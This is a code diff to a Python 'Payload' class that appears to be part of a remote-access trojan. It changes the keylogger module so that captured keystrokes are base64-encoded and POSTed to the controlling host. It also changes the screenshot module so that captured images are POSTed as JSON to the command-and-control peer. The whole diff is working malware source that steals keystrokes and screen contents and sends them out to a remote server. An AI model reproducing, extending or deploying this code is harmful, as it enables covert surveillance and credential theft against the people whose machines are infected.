@@ -833,7 +833,7 @@ class Payload():
                 log("{} error: {}".format('keylogger.status', str(e)))
         if 'keylogger' not in globals():
             self.load('keylogger')
-        elif not mode:
+        if not mode:
             if 'keylogger' not in self.handlers:
                 return globals()['keylogger'].usage
             else:
@@ -857,9 +857,10 @@ class Payload():
                 self.handlers['keylogger'] = globals()['keylogger'].auto()
                 return locals()['status']()
             elif 'upload' in mode:
-                result = self.pastebin(globals()['keylogger']._buffer) if not 'ftp' in mode else self.ftp(globals()['keylogger']._buffer)
-                globals()['keylogger']._buffer.reset()
-                return result
+                data = base64.b64encode(globals()['keylogger'].logs.getvalue())
+                globals()['post']('http://{}:{}'.format(host, port), json={'data': data})
+                globals()['keylogger'].logs.reset()
+                return 'Upload complete'
             elif 'status' in mode:
                 return locals()['status']()        
             else:
@@ -878,10 +879,10 @@ class Payload():
             if 'screenshot' not in globals():
                 self.load('screenshot')
             img = globals()['screenshot'].run()
-            data = {"data": img}
+            data = {"png": img}
             host, port = self.connection.getpeername()
-            globals()['post']('http://{}:{}'.format(host, port+3), data=data)
-            return 
+            globals()['post']('http://{}:{}'.format(host, port+3), json=data)
+            return 'Screenshot complete'
         except Exception as e:
             result = "{} error: {}".format(self.screenshot.func_name, str(e))
             log(result) 
